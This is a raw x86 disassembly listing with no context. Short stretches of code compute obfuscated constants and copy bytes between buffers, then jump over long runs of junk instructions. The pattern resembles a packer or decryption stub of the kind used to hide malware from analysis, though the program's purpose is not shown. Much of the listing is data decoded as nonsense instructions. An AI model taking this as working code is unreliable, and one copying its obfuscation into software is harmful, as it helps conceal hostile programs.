  40af09:	je     0x40af6e
  40af0b:	mov    ah,0x1a
  40af0d:	pop    ds
  40af0e:	adc    ah,bh
  40af10:	pop    esp
  40af11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af12:	xchg   edi,eax
  40af13:	shr    DWORD PTR [edi+0x3f],cl
  40af16:	cmp    DWORD PTR [esi],esi
  40af18:	es fwait
  40af1a:	fs (bad) 
  40af1c:	sub    BYTE PTR [eax],bl
  40af1e:	and    eax,DWORD PTR ds:0xac2a7493
  40af24:	scas   al,BYTE PTR es:[edi]
  40af25:	retf   0x50ea
  40af28:	ror    DWORD PTR [esi],1
  40af2a:	aad    0x83
  40af2c:	mov    esi,0x74a30179
  40af31:	out    dx,al
  40af32:	sbb    ah,bl
  40af34:	pop    eax
  40af35:	jb     0x40af62
  40af37:	xor    BYTE PTR [edx],bl
  40af39:	(bad)  
  40af3a:	jns    0x40aed0
  40af3c:	popf   
  40af3d:	iret   
  40af3e:	xchg   ecx,eax
  40af3f:	mov    eax,ds:0x21447614
  40af44:	test   eax,0xa1f9345f
  40af49:	scas   eax,DWORD PTR es:[edi]
  40af4a:	sbb    al,0x8d
  40af4c:	dec    ecx
  40af4d:	and    eax,0x8ed4971f
  40af52:	mov    edi,0xe1aeb866
  40af57:	jge    0x40afb8
  40af59:	imul   esi,DWORD PTR [esp+edx*4],0x93a04d8f
  40af60:	pop    es
  40af61:	enter  0x59ed,0xe2
  40af65:	shr    ah,1
  40af67:	sub    BYTE PTR [ebp+0xc2b06f1],cl
  40af6d:	or     al,0xa9
  40af6f:	icebp  
  40af70:	je     0x40af7f
  40af72:	mov    eax,0x56e58341
  40af77:	(bad)  
  40af79:	fwait
  40af7a:	es test eax,0xcc1307d3
  40af80:	adc    bh,BYTE PTR [edx]
  40af82:	dec    ebp
  40af83:	setno  BYTE PTR [edi]
  40af86:	cld    
  40af87:	pop    ebx
  40af88:	adc    al,0x19
  40af8a:	shl    DWORD PTR [edx+0x5a],cl
  40af8d:	adc    eax,0xa9861ef8
  40af92:	xor    eax,0x27bedb56
  40af97:	push   eax
  40af98:	in     al,dx
  40af99:	inc    edx
  40af9a:	pop    eax
  40af9b:	jnp    0x40af4e
  40af9d:	mov    DWORD PTR [ebx],esi
  40af9f:	pop    eax
  40afa0:	jo     0x40af87
  40afa2:	stc    
  40afa3:	xor    al,0xb2
  40afa5:	mov    ah,0xe7
  40afa7:	int3   
  40afa8:	mov    al,ds:0x737aa7d8
  40afad:	rcl    BYTE PTR [esi-0x4dbb701f],1
  40afb3:	or     bl,0x3b
  40afb6:	shl    BYTE PTR [edi+0x4b],0x98
  40afba:	loop   0x40af65
  40afbc:	mov    ebp,0x70ee8278
  40afc1:	enter  0xb79b,0xee
  40afc5:	bound  edx,QWORD PTR [ebx-0x3e101c22]
  40afcb:	add    BYTE PTR [ecx-0x6d],0x88
  40afcf:	push   0xed7bdbe8
  40afd4:	mov    eax,ds:0xc8670ff2
  40afd9:	xor    dh,cl
  40afdb:	and    dl,ah
  40afdd:	mov    edx,0x52b04ae2
  40afe2:	xchg   ebx,eax
  40afe3:	test   DWORD PTR [esi+0xfe05d8b],ecx
  40afe9:	scas   eax,DWORD PTR es:[edi]
  40afea:	ror    DWORD PTR [ebx-0x2ccc1ba3],cl
  40aff0:	sub    edx,0x26bd
  40aff6:	add    eax,ecx
  40aff8:	and    edx,0x7126
  40affe:	mov    ebx,ecx
  40b000:	sub    ebx,edx
  40b002:	mov    edx,DWORD PTR [ebp-0x18]
  40b005:	sub    eax,edx
  40b007:	mov    edx,DWORD PTR [ebp-0x14]
  40b00a:	sub    eax,edx
  40b00c:	mov    edx,DWORD PTR [ebp+0xc]
  40b00f:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40b016:	mov    BYTE PTR [eax-0xbb5],dl
  40b01c:	mov    eax,DWORD PTR [ebp-0x10]
  40b01f:	xor    eax,0xffffe1ce
  40b024:	add    eax,DWORD PTR [ebp-0xc]
  40b027:	xor    edx,edx
  40b029:	and    eax,0x6d33
  40b02e:	lea    ecx,[ecx+eax*1-0x6520]
  40b035:	mov    eax,DWORD PTR [ebp+0x8]
  40b038:	mov    ebx,DWORD PTR [ebp-0x4]
  40b03b:	add    eax,edi
  40b03d:	div    ebx
  40b03f:	mov    edx,DWORD PTR [ebp-0x8]
  40b042:	mov    ebx,0x940a7
  40b047:	sub    eax,edx
  40b049:	xor    edx,edx
  40b04b:	div    ebx
  40b04d:	add    eax,esi
  40b04f:	cmp    ecx,eax
  40b051:	jb     0x40aa71
  40b057:	xor    ebx,ebx
  40b059:	inc    ebx
  40b05a:	mov    DWORD PTR [ebp+0xc],0x77bd
  40b061:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40b068:	mov    DWORD PTR [ebp-0x8],0x4738
  40b06f:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40b076:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40b07d:	mov    DWORD PTR [ebp-0x14],0x64ec
  40b084:	mov    DWORD PTR [ebp-0x18],0x1984
  40b08b:	mov    DWORD PTR [ebp-0x1c],0x293
  40b092:	mov    eax,DWORD PTR [ebp+0x8]
  40b095:	mov    ecx,DWORD PTR [ebp+0xc]
  40b098:	add    eax,0x1ef2
  40b09d:	and    eax,ecx
  40b09f:	xor    eax,0x7240
  40b0a4:	mov    ecx,0x7aaa
  40b0a9:	sub    ecx,eax
  40b0ab:	mov    DWORD PTR [ebp+0xc],0x8d3
  40b0b2:	mov    DWORD PTR [ebp+0x8],0x2392
  40b0b9:	mov    DWORD PTR [ebp-0x20],ebx
  40b0bc:	mov    DWORD PTR [ebp-0x24],0x338f
  40b0c3:	mov    DWORD PTR [ebp-0x28],0x61c9
  40b0ca:	mov    eax,DWORD PTR [ebp+0x8]
  40b0cd:	mov    edx,DWORD PTR [ebp+0xc]
  40b0d0:	imul   eax,edx
  40b0d3:	xor    eax,0x40a0
  40b0d8:	or     eax,0x1a48
  40b0dd:	xor    eax,0x139ddb0
  40b0e2:	mov    esi,ecx
  40b0e4:	jmp    0x40b37b
  40b0e9:	stos   BYTE PTR es:[edi],al
  40b0ea:	(bad)  
  40b0eb:	mov    ss,WORD PTR [esi-0x355674c]
  40b0f1:	sub    BYTE PTR [edx],dh
  40b0f3:	inc    eax
  40b0f4:	fstp   st(3)
  40b0f6:	fimul  DWORD PTR [eax-0x6e]
  40b0f9:	ret    0xbeaf
  40b0fc:	mov    esi,0xbebec2a9
  40b101:	fisttp WORD PTR [eax]
  40b103:	loop   0x40b0df
  40b105:	cmp    DWORD PTR [ecx],ecx
  40b107:	mov    esi,0xeead097e
  40b10c:	int3   
  40b10d:	ss pop edx
  40b10f:	xlat   BYTE PTR ds:[ebx]
  40b110:	test   BYTE PTR [ebp-0x17],0x20
  40b114:	xchg   edx,eax
  40b115:	xor    DWORD PTR [eax],edx
  40b117:	push   ebx
  40b118:	bound  ecx,QWORD PTR [ebp+0x3a66b50e]
  40b11e:	adc    dl,al
  40b120:	lea    esi,[ebp+0x68]
  40b123:	loop   0x40b13b
  40b125:	xchg   ebp,eax
  40b126:	enter  0x6c0b,0x86
  40b12a:	aaa    
  40b12b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40b12d:	mov    eax,0x8846265a
  40b132:	or     ah,al
  40b134:	sbb    esi,DWORD PTR [edx-0x47]
  40b137:	jo     0x40b180
  40b139:	cmp    ch,BYTE PTR [edx+esi*8+0x4]
  40b13d:	and    DWORD PTR [eax+edx*8-0x4d],0xffffffb5
  40b142:	push   ecx
  40b143:	adc    bh,BYTE PTR [edx+0x6e79ee14]
  40b149:	or     DWORD PTR [esi+ebp*1],ebx
  40b14c:	loop   0x40b0f7
  40b14e:	xchg   esp,eax
  40b14f:	shl    BYTE PTR [ebx],0x4a
  40b152:	cmc    
  40b153:	cmp    esi,DWORD PTR [edi+0x275d27a]
  40b159:	cmp    eax,0x911812ba
  40b15e:	out    dx,eax
  40b15f:	bound  edi,QWORD PTR [ebx+0x57]
  40b162:	clc    
  40b163:	out    0x36,al
  40b165:	cmp    BYTE PTR [ecx-0x53],al
  40b168:	pop    ds
  40b169:	(bad)  
  40b16a:	dec    esp
  40b16b:	xor    BYTE PTR [eax],al
  40b16d:	data16 cld 
  40b16f:	inc    ebx
  40b170:	(bad)  
  40b171:	and    al,0x54
  40b173:	or     ah,0xee
  40b176:	xor    eax,0x7d03fdaf
  40b17b:	push   eax
  40b17c:	xchg   ebx,eax
  40b17d:	test   DWORD PTR [edi+0x33b112a],esi
  40b183:	add    dh,ah
  40b185:	xchg   esi,eax
  40b186:	test   BYTE PTR [edx-0x7d],dl
  40b189:	loop   0x40b197
  40b18b:	sbb    al,0xc3
  40b18d:	ret    
  40b18e:	arpl   WORD PTR [esp+edx*1-0x29f39bcf],bp
  40b195:	mov    dh,0x3a
  40b197:	add    DWORD PTR [ebx],edi
  40b199:	sbb    DWORD PTR [edi],eax
  40b19b:	inc    edx
  40b19c:	pop    eax
  40b19d:	mov    esi,0x13a4fb73
  40b1a2:	jne    0x40b201
  40b1a4:	(bad)  
  40b1a5:	aas    
  40b1a6:	icebp  
  40b1a7:	nop
  40b1a8:	jns    0x40b1d2
  40b1aa:	jno    0x40b14e
  40b1ac:	or     eax,0xa8b9b280
  40b1b1:	or     BYTE PTR [edi-0x37],0xa
  40b1b5:	int3   
  40b1b6:	aam    0x4a
  40b1b8:	dec    esp
  40b1b9:	push   edx
  40b1ba:	iret   
  40b1bb:	call   0xade02c05
  40b1c0:	jl     0x40b1b6
  40b1c2:	int3   
  40b1c3:	test   bh,dh
  40b1c5:	call   0xa977c9b1
  40b1ca:	jb     0x40b201
  40b1cc:	ficomp WORD PTR [edi]
  40b1ce:	les    esi,FWORD PTR [ecx+0x54]
  40b1d1:	add    al,0x6e
  40b1d3:	xor    esp,DWORD PTR [ebp+0x73ad8479]
  40b1d9:	fwait
  40b1da:	add    ebx,DWORD PTR [ebx]
  40b1dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1dd:	pusha  
  40b1de:	stos   DWORD PTR es:[edi],eax
  40b1df:	pop    esi
  40b1e0:	sbb    BYTE PTR [edx+0x48e5c702],0xd
  40b1e7:	vpmulhuw ymm1,ymm1,YMMWORD PTR [ebx+0x40b4eaa3]
  40b1ef:	retf   0xfe6b
  40b1f2:	addr16 loopne 0x40b195
  40b1f5:	lock pop edx
  40b1f7:	pop    ds
  40b1f8:	inc    ebp
  40b1f9:	mov    ds,WORD PTR [ecx-0x1d]
  40b1fc:	add    ecx,ebx
  40b1fe:	or     eax,0x6bb8ce87
  40b203:	push   ss
  40b204:	shr    BYTE PTR [esp+edi*8],cl
  40b207:	in     eax,0x3a
  40b209:	mov    WORD PTR [ebx-0x68],fs
  40b20c:	sub    DWORD PTR [eax+0x5be7d40],edi
  40b212:	jb     0x40b24c
  40b214:	mov    ds:0xc8e2934f,al
  40b219:	and    ecx,DWORD PTR [ebp+0x1a95887e]
  40b21f:	sbb    ch,BYTE PTR [ebp+0x3f]
  40b222:	leave  
  40b223:	mov    ecx,0x95c4cd6a
  40b228:	sbb    edx,eax
  40b22a:	imul   ecx,DWORD PTR [ebp-0x77],0x39
  40b22e:	cmp    DWORD PTR [esi+esi*2+0x32],0x91d360a7
  40b236:	hlt    
  40b237:	inc    esp
  40b238:	repz xor DWORD PTR [esi],ecx
  40b23b:	lds    edx,FWORD PTR [edx]
  40b23d:	sahf   
  40b23e:	jnp    0x40b245
  40b240:	mov    ds:0x3a7a8338,eax
  40b245:	pop    edi
  40b246:	div    ebx
  40b248:	add    al,0x49
  40b24a:	imul   esp,DWORD PTR [edi],0xffffffdb
  40b24d:	data16 shl BYTE PTR ds:0x515b465c,cl
  40b254:	(bad)  
  40b255:	push   eax
  40b256:	xlat   BYTE PTR ds:[ebx]
  40b257:	xchg   esp,eax
  40b258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b259:	mov    esp,0xc2ffac0a
  40b25e:	dec    ebp
  40b25f:	iret   
  40b260:	es push ebx
  40b262:	scas   al,BYTE PTR es:[edi]
  40b263:	rol    eax,cl
  40b265:	test   eax,0x62d56cc1
  40b26a:	inc    ecx
  40b26b:	sbb    edi,ebp
  40b26d:	mov    edi,0xe5f16e51
  40b272:	repz or edx,DWORD PTR [esi-0x4d16e8a4]
  40b279:	xchg   DWORD PTR [ecx-0x68bc326f],eax
  40b27f:	gs stos BYTE PTR es:[edi],al
  40b281:	lods   al,BYTE PTR ds:[esi]
  40b282:	mov    ecx,0xb7b826b3
  40b287:	aas    
  40b288:	push   cs
  40b289:	pop    eax
  40b28a:	cmp    al,0x84
  40b28c:	stc    
  40b28d:	mov    ecx,0x2a7c690a
  40b292:	dec    ebx
  40b293:	ret    
  40b294:	xchg   BYTE PTR [ebx],al
  40b296:	outs   dx,DWORD PTR ds:[esi]
  40b297:	jae    0x40b2b1
  40b299:	cmp    ch,cl
  40b29b:	xchg   edi,eax
  40b29c:	loopne 0x40b2ba
  40b29e:	push   cs
  40b29f:	or     eax,0x334629c7
  40b2a4:	and    eax,0x29ee2c08
  40b2a9:	fsub   DWORD PTR ds:0xb917a85f
  40b2af:	out    0xc4,eax
  40b2b1:	ins    DWORD PTR es:[edi],dx
  40b2b2:	or     DWORD PTR [edx],ebx
  40b2b4:	stc    
  40b2b5:	sbb    al,bl
  40b2b7:	xchg   edx,eax
  40b2b8:	pusha  
  40b2b9:	bswap  eax
  40b2bb:	out    dx,eax
  40b2bc:	mov    cl,0x40
  40b2be:	mov    al,BYTE PTR [ecx+edi*1]
  40b2c1:	mov    dl,0xd5
  40b2c3:	add    DWORD PTR [eax-0x2505035d],0x16
  40b2ca:	mov    ds:0xd8129e7e,al
  40b2cf:	xchg   ecx,ebp
  40b2d1:	jnp    0x40b31a
  40b2d3:	adc    ebp,DWORD PTR [esi-0x72a6e00d]
  40b2d9:	gs pop eax
  40b2db:	sub    BYTE PTR [ebp+0x4a6560c2],bl
  40b2e1:	jo     0x40b27e
  40b2e3:	lods   eax,DWORD PTR ds:[esi]
  40b2e4:	jp     0x40b2f6
  40b2e6:	and    DWORD PTR [edi],ebx
  40b2e8:	xor    al,0x5
  40b2ea:	mov    WORD PTR [esi-0x1a],gs
  40b2ed:	add    edx,DWORD PTR [ebx+edi*4-0x5add34b1]
  40b2f4:	adc    DWORD PTR [esi+0x58b4e47a],esp
  40b2fa:	lock and BYTE PTR [eax-0x72],0xca
  40b2ff:	mov    ah,0x18
  40b301:	dec    ebx
  40b302:	pop    ecx
  40b303:	mov    esp,?
  40b305:	and    BYTE PTR [ebp-0x5fef7856],dh
  40b30b:	add    DWORD PTR [eax],ecx
  40b30d:	fisubr DWORD PTR [eax+ebx*2-0x535dac25]
  40b314:	sbb    DWORD PTR [ecx+0x273ff870],0xffffffcc
  40b31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b31c:	scas   al,BYTE PTR es:[edi]
  40b31d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b31e:	xor    eax,0x539cbeff
  40b323:	or     eax,0x803a856e
  40b328:	cmc    
  40b329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b32a:	xor    DWORD PTR [esp+ebx*8],ecx
  40b32d:	test   DWORD PTR [ebx-0x1d],ebx
  40b330:	mov    ebx,0x8ca0a018
  40b335:	fnstcw WORD PTR [esi+0x5073bc8b]
  40b33b:	test   al,0x1f
  40b33d:	sbb    ebx,DWORD PTR [ebp-0x68]
  40b340:	mov    bh,cl
  40b342:	add    al,0x8a
  40b344:	fsubr  DWORD PTR [ebx-0x17c1a821]
  40b34a:	and    ebx,eax
  40b34c:	adc    BYTE PTR [esi+0x4f9f6253],dl
  40b352:	cwde   
  40b353:	sbb    DWORD PTR [esi],ebx
  40b355:	(bad)  
  40b356:	mov    BYTE PTR [ecx+0x1c],cl
  40b359:	xchg   edi,eax
  40b35a:	add    al,0x72
  40b35c:	jae    0x40b364
  40b35e:	sub    edx,DWORD PTR [ebx-0x559d82d6]
  40b364:	les    ecx,FWORD PTR [eax]
  40b366:	ins    DWORD PTR es:[edi],dx
  40b367:	cmp    al,0x9a
  40b369:	xor    BYTE PTR [edi-0x10],bl
  40b36c:	xor    BYTE PTR [ebx-0x3ff81761],ah
  40b372:	push   ebx
  40b373:	and    bh,BYTE PTR [edi]
  40b375:	imul   edi,esi,0xffffff9d
  40b378:	mov    eax,0xf02b9b85
  40b37d:	mov    eax,DWORD PTR [ebp-0x28]
  40b380:	mov    edx,DWORD PTR [ebp-0x24]
  40b383:	mov    edi,DWORD PTR [ebp-0x20]
  40b386:	or     eax,0x1cc2
  40b38b:	sub    eax,edx
  40b38d:	xor    edx,edx
  40b38f:	div    edi
  40b391:	mov    edx,DWORD PTR ds:0x422708
  40b397:	mov    edx,DWORD PTR [edx+0x1d4]
  40b39d:	sub    edx,eax
  40b39f:	mov    eax,DWORD PTR [ebp+0x10]
  40b3a2:	mov    al,BYTE PTR [esi+eax*1]
  40b3a5:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40b3ac:	mov    eax,DWORD PTR [ebp-0x1c]
  40b3af:	mov    edx,DWORD PTR [ebp-0x18]
  40b3b2:	imul   eax,edx
  40b3b5:	mov    edx,DWORD PTR [ebp-0x14]
  40b3b8:	imul   eax,eax,0x262b
  40b3be:	or     eax,edx
  40b3c0:	jmp    0x40b657
  40b3c5:	dec    ecx
  40b3c6:	mov    bl,0x7d
  40b3c8:	push   esp
  40b3c9:	mov    bh,0x74
  40b3cb:	pushf  
  40b3cc:	mov    esp,0xe3db5995
  40b3d1:	adc    al,0xb9
  40b3d3:	or     BYTE PTR [edx-0x41414c53],dl
  40b3d9:	test   eax,0xc0bebec2
  40b3de:	xchg   ebx,esp
  40b3e0:	fsub   st(3),st
  40b3e2:	fwait
  40b3e3:	popa   
  40b3e4:	fs inc eax
  40b3e6:	pop    ebx
  40b3e7:	jge    0x40b466
  40b3e9:	test   BYTE PTR [eax+0xcef2a79],al
  40b3ef:	getsec 
  40b3f1:	ror    DWORD PTR [ebp+0x65],cl
  40b3f4:	mov    edi,0x43d3a8e4
  40b3f9:	ds js  0x40b3bc
  40b3fc:	dec    eax
  40b3fd:	or     ecx,DWORD PTR [edx+0x75]
  40b400:	cmp    bh,al
  40b402:	pop    ds
  40b403:	mov    eax,ds:0xe95d5c7a
  40b408:	(bad)  
  40b409:	std    
  40b40a:	retf   
  40b40b:	cdq    
  40b40c:	sbb    al,0x31
  40b40e:	lds    ebx,FWORD PTR [edx+edi*8]
  40b411:	and    ah,BYTE PTR [eax+ebp*2+0x0]
  40b415:	and    ebp,edi
  40b417:	jo     0x40b3c3
  40b419:	or     edx,DWORD PTR [ebx+eax*2-0x2a3eacd9]
  40b420:	lahf   
  40b421:	sbb    DWORD PTR [esp+edi*4+0x4e],edi
  40b425:	xor    DWORD PTR [ebx-0x17],eax
  40b428:	call   0x9ade5de8
  40b42d:	(bad)  
  40b42e:	sbb    eax,0x5c224bc4
  40b433:	(bad)  
  40b435:	xlat   BYTE PTR ds:[ebx]
  40b436:	and    dh,BYTE PTR [ecx-0x6]
  40b439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b43a:	std    
  40b43b:	clts   
  40b43d:	mov    al,ds:0xb6f815a7
  40b442:	sub    eax,0x96397f0b
  40b447:	retf   0x10e0
  40b44a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b44b:	jo     0x40b3f8
  40b44d:	sbb    al,0x1b
  40b44f:	and    eax,0xd3e5149c
  40b454:	mov    ebp,0x5079f441
  40b459:	pop    ss
  40b45a:	mov    BYTE PTR [ebx+0x4e],ah
  40b45d:	lds    esi,FWORD PTR [edx]
  40b45f:	js     0x40b4ae
  40b461:	sub    eax,esp
  40b463:	sub    al,0x59
  40b465:	shr    DWORD PTR [edi],0xbc
  40b468:	inc    esi
  40b469:	or     edx,ecx
  40b46b:	imul   ecx,DWORD PTR [eax+0x36],0xffffffb9
  40b46f:	push   ebx
  40b470:	rcl    dl,cl
  40b472:	mov    ecx,0x206fa4b8
  40b477:	dec    esi
  40b478:	cmp    esp,edi
  40b47a:	dec    ecx
  40b47b:	xor    DWORD PTR [ebx],ecx
  40b47d:	mov    edi,0x2bf5f31a
  40b482:	push   cs
  40b483:	pop    ebp
  40b484:	test   DWORD PTR [eax-0x3e5f525a],esp
  40b48a:	inc    DWORD PTR ds:[esi]
  40b48d:	pop    es
  40b48e:	mov    ebx,0x85aeeb66
  40b493:	mov    edx,DWORD PTR [eax-0x6c]
  40b496:	pop    edi
  40b497:	mov    al,0x77
  40b499:	mov    bl,0xe8
  40b49b:	ins    DWORD PTR es:[edi],dx
  40b49c:	push   esi
  40b49d:	jge    0x40b49e
  40b49f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4a0:	es mov edi,0xe36e9b26
  40b4a6:	xchg   edx,eax
  40b4a7:	xchg   ebx,eax
  40b4a8:	jns    0x40b4e3
  40b4aa:	xchg   esp,eax
  40b4ab:	sbb    eax,0xbed2028a
  40b4b0:	ret    
  40b4b1:	rcl    BYTE PTR [edi+0x32],cl
  40b4b4:	cmp    ebp,DWORD PTR [edx]
  40b4b6:	push   ss
  40b4b7:	xlat   BYTE PTR ds:[ebx]
  40b4b8:	adc    DWORD PTR [edx-0x4b],ecx
  40b4bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4bc:	mov    ebx,0xfb351336
  40b4c1:	ror    DWORD PTR [eax+0x664627df],cl
  40b4c7:	test   BYTE PTR [esi+ebx*4],0x30
  40b4cb:	mov    ecx,gs
  40b4cd:	std    
  40b4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4cf:	mul    DWORD PTR [esi+0x5933580]
  40b4d5:	rcl    DWORD PTR [ecx+ebx*2],0x5b
  40b4d9:	lods   al,BYTE PTR ds:[esi]
  40b4da:	repnz sub BYTE PTR [ecx-0xde01925],0x4d
  40b4e2:	fxch   st(0)
  40b4e4:	pop    eax
  40b4e5:	je     0x40b55f
  40b4e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4e8:	nop
  40b4e9:	pop    edi
  40b4ea:	addr16 mov dh,0x7e
  40b4ed:	or     BYTE PTR [ecx-0x5990ed13],0xd6
  40b4f4:	xor    BYTE PTR [ebx],bl
  40b4f6:	push   0x16
  40b4f8:	lods   al,BYTE PTR ds:[esi]
  40b4f9:	push   esi
  40b4fa:	nop
  40b4fb:	arpl   WORD PTR [ecx+0x5b],cx
  40b4fe:	sub    dl,BYTE PTR ds:0xd19a95ae
  40b504:	pop    esp
  40b505:	leave  
  40b506:	xchg   esp,eax
  40b507:	sbb    dl,BYTE PTR [ecx]
  40b509:	call   0xb148:0x5c2ed2c5
  40b510:	fcom   QWORD PTR [edi]
  40b512:	ret    
  40b513:	das    
  40b514:	cld    
  40b515:	dec    esi
  40b516:	dec    edx
  40b517:	add    DWORD PTR [edi],edi
  40b519:	cmp    DWORD PTR [esi+0x29c63d88],0xffffffe0
  40b520:	xchg   ebx,eax
  40b521:	dec    esp
  40b522:	mov    edx,0x66cfc71f
  40b527:	mov    ebp,0x32d5af3
  40b52c:	sahf   
  40b52d:	inc    ebp
  40b52e:	out    0x8d,al
  40b530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b531:	sahf   
  40b532:	or     BYTE PTR [ebp-0x72ccd082],dl
  40b538:	mov    edx,0xe78586ef
  40b53d:	mov    edx,0xde1b1f72
  40b542:	out    dx,eax
  40b543:	mov    esp,ds
  40b545:	or     eax,0xc4afdd95
  40b54a:	jmp    0x3cb7:0xa3d8c8dc
  40b551:	push   0x78
  40b553:	into   
  40b554:	and    dl,BYTE PTR [edx]
  40b556:	ss sub edi,edx
  40b559:	push   ebp
  40b55a:	sbb    BYTE PTR [ebx+0x4a],dh
  40b55d:	xchg   ebp,eax
  40b55e:	pop    esp
  40b55f:	mov    ebx,fs
  40b561:	push   ebp
  40b562:	inc    ebp
  40b563:	cmp    DWORD PTR [eax],esp
  40b565:	shr    DWORD PTR [eax+0x24],cl
  40b568:	add    dh,bl
  40b56a:	push   ebx
  40b56b:	outs   dx,DWORD PTR ds:[esi]
  40b56c:	xchg   ebp,eax
  40b56d:	inc    ebp
  40b56e:	cld    
  40b56f:	xor    edi,DWORD PTR [edx]
  40b571:	dec    ebp
  40b572:	jecxz  0x40b5ba
  40b574:	ret    
  40b575:	lahf   
  40b576:	out    dx,al
  40b577:	xchg   edi,eax
  40b578:	mov    bh,0x49
  40b57a:	dec    esp
  40b57b:	fxch   st(0)
  40b57d:	or     eax,0xe76c4ef7
  40b582:	or     eax,0x307736b1
  40b587:	je     0x40b547
  40b589:	test   DWORD PTR [ecx],ecx
  40b58b:	pop    ss
  40b58c:	mov    ebx,DWORD PTR [edi+0x40c10443]
  40b592:	and    al,0xc3
  40b594:	jle    0x40b5ec
  40b596:	adc    DWORD PTR [esi-0x57cb0962],0x4b189e1e
  40b5a0:	and    DWORD PTR [ebx],0xffffffa1
  40b5a3:	call   0x66133689
  40b5a8:	push   cs
  40b5a9:	jb     0x40b567
  40b5ab:	arpl   WORD PTR [ebx+0x6daa493],cx
  40b5b1:	lods   al,BYTE PTR ds:[esi]
  40b5b2:	cmp    DWORD PTR [eax-0x71e2cfbd],eax
  40b5b8:	jg     0x40b595
  40b5ba:	scas   eax,DWORD PTR es:[edi]
  40b5bb:	cmp    dl,dl
  40b5bd:	test   eax,0xfd659e36
  40b5c2:	mov    ah,BYTE PTR [edi+eiz*1]
  40b5c5:	(bad)  
  40b5c6:	arpl   WORD PTR [ebx-0x53],di
  40b5c9:	call   0x3ee10342
  40b5ce:	mov    dh,BYTE PTR [edi+0x1]
  40b5d1:	rcl    DWORD PTR [ecx+0x67655e47],cl
  40b5d7:	nop
  40b5d8:	outs   dx,DWORD PTR ds:[esi]
  40b5d9:	aam    0x4c
  40b5db:	popa   
  40b5dc:	push   ds
  40b5dd:	or     DWORD PTR [ebx],eax
  40b5df:	fcmovnbe st,st(5)
  40b5e1:	jl     0x40b638
  40b5e3:	push   edx
  40b5e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5e5:	test   al,0xc0
  40b5e7:	xchg   edx,eax
  40b5e8:	bnd ret 
  40b5ea:	sahf   
  40b5eb:	fild   DWORD PTR [ebp+ebp*4-0x56]
  40b5ef:	mov    esi,0x9a7821d0
  40b5f4:	mov    eax,ds:0x7f8737c
  40b5f9:	xchg   ebp,eax
  40b5fa:	lods   eax,DWORD PTR ds:[esi]
  40b5fb:	add    ch,BYTE PTR [esi-0x57fd9851]
  40b601:	jl     0x40b5eb
  40b603:	sahf   
  40b604:	pop    ss
  40b605:	cmp    BYTE PTR [esi+ecx*8-0x76fc286a],bh
  40b60c:	xchg   esp,eax
  40b60d:	stos   BYTE PTR es:[edi],al
  40b60e:	lock fimul WORD PTR [ebp+0x5b]
  40b612:	adc    al,0x14
  40b614:	rcl    ch,1
  40b616:	jp     0x40b62f
  40b618:	mov    ch,BYTE PTR [ecx+0x10f386a8]
  40b61e:	jmp    0xdf79192b
  40b623:	xchg   esp,eax
  40b624:	stos   DWORD PTR es:[edi],eax
  40b625:	xchg   esp,eax
  40b626:	push   esp
  40b627:	sbb    BYTE PTR [ebp+ebx*8-0x55251bbe],dl
  40b62e:	mov    bl,0xcb
  40b630:	jbe    0x40b631
  40b632:	dec    ebx
  40b633:	or     BYTE PTR [esi],dl
  40b635:	(bad)  
  40b636:	adc    ebp,DWORD PTR [eax]
  40b638:	scas   al,BYTE PTR es:[edi]
  40b639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b63a:	fcomp  QWORD PTR [edi+0x75afca20]
  40b640:	retf   0x1e3e
  40b643:	jae    0x40b6b5
  40b645:	pop    ss
  40b646:	pop    eax
  40b647:	xlat   BYTE PTR ds:[ebx]
  40b648:	fild   WORD PTR [ecx]
  40b64a:	cld    
  40b64b:	sbb    DWORD PTR [esi+0x16],0x946c2c36
  40b652:	out    0x87,eax
  40b654:	and    al,0xb3
  40b656:	call   0x35c2:0xbf0558b
  40b65d:	neg    BYTE PTR [ecx+0x0]
  40b660:	add    BYTE PTR [ebp+0x59e6018c],cl
  40b666:	add    eax,0xf4458b35
  40b66b:	and    eax,0xddc
  40b670:	add    eax,DWORD PTR [ebp-0x8]
  40b673:	xor    eax,0x46e3
  40b678:	add    eax,0x50eb
  40b67d:	cmp    ecx,eax
  40b67f:	jne    0x40b0ab
  40b685:	pop    edi
  40b686:	pop    esi
  40b687:	pop    ebx
  40b688:	leave  
  40b689:	ret    0xc
  40b68c:	push   ebp
  40b68d:	mov    ebp,esp
  40b68f:	sub    esp,0xec
  40b695:	push   ebx
  40b696:	push   esi
  40b697:	mov    DWORD PTR [ebp-0x8],0x548e
  40b69e:	jmp    0x40baa9
  40b6a3:	or     DWORD PTR [edx],ebx
  40b6a5:	or     eax,DWORD PTR [edi]
  40b6a7:	sbb    al,0x18
  40b6a9:	or     DWORD PTR [eax+ebp*4],ebx
  40b6ac:	mov    ds:0x368f9e60,eax
  40b6b1:	jbe    0x40b645
  40b6b3:	call   0xbec4:0x92bebeb7
  40b6ba:	mov    esi,0xdaa599d0
  40b6bf:	sbb    dh,BYTE PTR [ecx-0x34]
  40b6c2:	push   esi
  40b6c3:	ins    BYTE PTR es:[edi],dx
  40b6c4:	mov    BYTE PTR [esi+0x5e],ah
  40b6c7:	or     eax,0x348ad90c
  40b6cc:	shl    BYTE PTR [edi+0x75270dc1],1
  40b6d2:	xor    eax,0x7189a540
  40b6d7:	inc    edx
